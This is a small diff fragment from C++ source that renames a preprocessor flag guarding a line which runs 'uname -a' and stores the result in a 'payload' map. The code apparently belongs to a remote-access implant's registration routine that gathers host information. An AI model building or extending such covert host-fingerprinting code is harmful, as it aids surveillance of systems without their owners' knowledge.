@@ -160,7 +160,7 @@ bool Ghost::reg() {
     };
 
     #ifdef FEATURE_GATHERING
-        #ifdef METHOD_SYSINFO
+        #ifdef GATHER_SYSINFO
         payload["sysinfo"] = SystemUtils::ExecuteCommand("uname -a");
         #endif
     #endif
